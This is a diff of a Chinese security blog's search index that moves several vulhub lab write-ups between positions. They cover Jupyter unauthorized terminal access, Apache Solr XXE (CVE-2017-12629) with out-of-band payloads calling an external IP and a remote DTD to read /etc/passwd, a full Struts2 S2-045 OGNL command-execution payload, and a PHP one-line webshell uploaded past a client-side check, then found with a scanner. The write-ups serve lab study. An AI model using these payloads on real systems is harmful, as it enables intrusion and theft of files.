+<img data-src="https://images.gaifagafin.top/202311222303053.png" style="zoom:80%;" />
+
+<p>发送请求，成功读取etc&#x2F;passwd</p>
+<img data-src="https://images.gaifagafin.top/202311222303452.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
+<ol>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+
+<p>可以直接执行任意命令：</p>
+<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -530,118 +642,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Apache solr XXE漏洞(CVE-2017-12629)</title>
-    <url>/2023/11/22/Apache-solr-XXE%E6%BC%8F%E6%B4%9E(CVE-2017-12629)/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache solr XXE漏洞(CVE-2017-12629)</p>
-<ol>
-<li>复现环境中的XXE漏洞，截图证明</li>
-<li>利用XXE漏洞发送HTTP请求，在VPS服务器接收请求，或收到DNS记录。（SSRF利用）</li>
-<li>利用XXE漏洞读取本地的 &#x2F;etc&#x2F;passwd文件。（文件读取利用）</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞文件目录下，运行漏洞环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>一般情况下，有些网站会支持XML-RPC（XML Remote Procedure Call），用户提交数据格式如下：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxe</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aaa.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;student&gt;</span><br><span class="line">&lt;useername&gt;xxx&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yyy&lt;/password&gt;</span><br><span class="line">&lt;address&gt;zzz&lt;/address&gt;</span><br><span class="line">&lt;/student&gt;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者可通过插入DTD标签来读取文件：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxe</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aaa.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;student&gt;</span><br><span class="line">&lt;useername&gt;xxx&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yyy&lt;/password&gt;</span><br><span class="line">&lt;address&gt;zzz&lt;/address&gt;</span><br><span class="line">&lt;/student&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE漏洞复现"><a href="#XXE漏洞复现" class="headerlink" title="XXE漏洞复现"></a>XXE漏洞复现</h2><p>构造payload：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
-
-<p>将其进行<strong>url编码</strong>：</p>
-<p><img data-src="https://images.gaifagafin.top/202311222302622.png"></p>
-<p>发送的http包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/demo/select?q=&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//192.168.137.1%3a6666&quot;&gt;%25remote%3b]&gt;&lt;root/&gt;&amp;wt=xml&amp;defType=xmlparser</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>mLvnBZTNP4mtS=5Z6BRWE9ckgj5fVytACBSQ8aUystMk7Xqg5ADwRXx9DCR4ti2XwAEqlXYac1OobPa1mooZWhy38M7.LkRxVTZoq; _xsrf=2|cc5a6916|387e0088d1426ad0f563ffb88c9227eb|1700298115</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br></pre></td></tr></table></figure>
-
-<p>在宿主机的cmd窗口输入<code>python -m http.server 6666</code>或者<code>nc -lvp 6666</code></p>
-<p>监听6666端口</p>
-<img data-src="https://images.gaifagafin.top/202311222302835.png" style="zoom:80%;" />
-
-<img data-src="https://images.gaifagafin.top/202311222303032.png" style="zoom:80%;" />
-
-<p>将构造的http请求发送</p>
-<img data-src="https://images.gaifagafin.top/202311222303090.png" style="zoom:80%;" />
-
-<p>由于这是<strong>blind XXE</strong>，页面不会回显，但刚刚创建的http服务器可以收到请求</p>
-<img data-src="https://images.gaifagafin.top/202311222303346.png" style="zoom:80%;" />
-
-<p>使用<code>nc</code>监听也可以收到java请求，内容更详细</p>
-<img data-src="https://images.gaifagafin.top/202311222303643.png" style="zoom:80%;" />
-
-<p>接下来利用<strong>Error Based XXE</strong>读取文件</p>
-<p>首先在宿主机www目录下新建1.dtd,写入下面内容读取&#x2F;etc文件夹内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[<span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
-
-<p>将payload进行url编码：</p>
-<img data-src="https://images.gaifagafin.top/202311222303378.png" style="zoom:80%;" />
-
-<p>发送请求后，成功读取到<code>/etc</code>文件夹内容</p>
-<img data-src="https://images.gaifagafin.top/202311222303592.png" style="zoom:80%;" />
-
-<h1 id="SSRF利用-VPS接收请求"><a href="#SSRF利用-VPS接收请求" class="headerlink" title="SSRF利用(VPS接收请求)"></a>SSRF利用(VPS接收请求)</h1><p>基于漏洞复现中的内容，直接构造payload：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.109.111.193:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
-
-<p>将payload进行url编码：</p>
-<img data-src="https://images.gaifagafin.top/202311222303570.png" style="zoom:80%;" />
-
-<p>发送请求后，在VPS服务器上接收到请求</p>
-<img data-src="https://images.gaifagafin.top/202311222303536.png" style="zoom:80%;" />
-
-<h1 id="读取-etc-passwd"><a href="#读取-etc-passwd" class="headerlink" title="读取&#x2F;etc&#x2F;passwd"></a>读取&#x2F;etc&#x2F;passwd</h1><p>将<code>1.dtd</code>中的内容改成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[<span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
-
-<p>将payload进行url编码：</p>
-<img data-src="https://images.gaifagafin.top/202311222303053.png" style="zoom:80%;" />
-
-<p>发送请求，成功读取etc&#x2F;passwd</p>
-<img data-src="https://images.gaifagafin.top/202311222303452.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Jupyter Notebook 未授权访问漏洞</title>
-    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
-<ol>
-<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
-<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
-
-<p>可以直接执行任意命令：</p>
-<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
-
-<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux_GPG加解密文件</title>
     <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
@@ -939,8 +939,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1811,42 +1811,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
-    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
-<ol>
-<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
-<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
-
-<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
-<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
-
-<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
-<p>进入容器验证，成功读取</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
-<hr>
-<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThinkPHP 2.x 任意代码执行漏洞</title>
     <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
@@ -1877,8 +1841,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1927,8 +1891,44 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
+    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
+<ol>
+<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
+<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
+
+<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
+<p>进入容器验证，成功读取</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
+<hr>
+<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2002,8 +2002,53 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用河马对PHP Webshell进行查杀</title>
+    <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
+    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
+<img data-src="https://images.gaifagafin.top/202311162320021.png" style="zoom: 67%;" />
+
+<p>先创建一个PHP一句话木马shell.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里如果直接上传一个shell.php文件的话，会显示上传文件不符合要求</p>
+<p>于是先将shell文件的后缀改成<code>.jpg</code>，然后burpsuite开启代理后再点击上传文件</p>
+<img data-src="https://images.gaifagafin.top/202311162320578.png" alt="抓到的数据包" style="zoom:67%;" />
+
+<p>将shell.jpg改成<code>shell.php</code>后点击发送</p>
+<img data-src="https://images.gaifagafin.top/202311162320533.png" style="zoom:67%;" />
+
+<p>页面回显文件上传成功</p>
+<img data-src="https://images.gaifagafin.top/202311162320623.png" style="zoom:80%;" />
+
+<p>用蚁剑连接，url地址是：</p>
+<p><code>http://localhost:8888/pikachu/vul/unsafeupload/uploads/shell.php</code></p>
+<img data-src="https://images.gaifagafin.top/202311162320789.png" style="zoom: 80%;" />
+
+<p>可以看到连接成功，证明已经将一句话木马上传</p>
+<img data-src="https://images.gaifagafin.top/202311162320505.png" style="zoom:67%;" />
+
+<h1 id="使用河马查杀脚本木马"><a href="#使用河马查杀脚本木马" class="headerlink" title="使用河马查杀脚本木马"></a>使用河马查杀脚本木马</h1><h2 id="安装河马"><a href="#安装河马" class="headerlink" title="安装河马"></a>安装河马</h2><p>详情见官方教程：<a href="https://www.shellpub.com/doc/hm_win_usage.html">https://www.shellpub.com/doc/hm_win_usage.html</a></p>
+<h2 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h2><p>进入软件点击立即扫描</p>
+<img data-src="https://images.gaifagafin.top/202311162320739.png" style="zoom: 67%;" />
+
+<p>点击添加扫描路径，将可能存在Webshell的目录添加上去，点击开始扫描</p>
+<img data-src="https://images.gaifagafin.top/202311162320607.png" style="zoom: 80%;" />
+
+<p>扫描结果如下，点击查看，正是之前上传的一句话木马</p>
+<img data-src="https://images.gaifagafin.top/202311162320240.png" style="zoom:67%;" />
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此次实验使用了河马这款Webshell扫描工具对常见的PHP木马进行查杀，了解了这款扫描工具的使用</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Webshell扫描</tag>
       </tags>
   </entry>
   <entry>
@@ -2210,51 +2255,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用河马对PHP Webshell进行查杀</title>
-    <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
-    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
-<img data-src="https://images.gaifagafin.top/202311162320021.png" style="zoom: 67%;" />
-
-<p>先创建一个PHP一句话木马shell.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里如果直接上传一个shell.php文件的话，会显示上传文件不符合要求</p>
-<p>于是先将shell文件的后缀改成<code>.jpg</code>，然后burpsuite开启代理后再点击上传文件</p>
-<img data-src="https://images.gaifagafin.top/202311162320578.png" alt="抓到的数据包" style="zoom:67%;" />
-
-<p>将shell.jpg改成<code>shell.php</code>后点击发送</p>
-<img data-src="https://images.gaifagafin.top/202311162320533.png" style="zoom:67%;" />
-
-<p>页面回显文件上传成功</p>
-<img data-src="https://images.gaifagafin.top/202311162320623.png" style="zoom:80%;" />
-
-<p>用蚁剑连接，url地址是：</p>
-<p><code>http://localhost:8888/pikachu/vul/unsafeupload/uploads/shell.php</code></p>
-<img data-src="https://images.gaifagafin.top/202311162320789.png" style="zoom: 80%;" />
-
-<p>可以看到连接成功，证明已经将一句话木马上传</p>
-<img data-src="https://images.gaifagafin.top/202311162320505.png" style="zoom:67%;" />
-
-<h1 id="使用河马查杀脚本木马"><a href="#使用河马查杀脚本木马" class="headerlink" title="使用河马查杀脚本木马"></a>使用河马查杀脚本木马</h1><h2 id="安装河马"><a href="#安装河马" class="headerlink" title="安装河马"></a>安装河马</h2><p>详情见官方教程：<a href="https://www.shellpub.com/doc/hm_win_usage.html">https://www.shellpub.com/doc/hm_win_usage.html</a></p>
-<h2 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h2><p>进入软件点击立即扫描</p>
-<img data-src="https://images.gaifagafin.top/202311162320739.png" style="zoom: 67%;" />
-
-<p>点击添加扫描路径，将可能存在Webshell的目录添加上去，点击开始扫描</p>
-<img data-src="https://images.gaifagafin.top/202311162320607.png" style="zoom: 80%;" />
-
-<p>扫描结果如下，点击查看，正是之前上传的一句话木马</p>
-<img data-src="https://images.gaifagafin.top/202311162320240.png" style="zoom:67%;" />
-
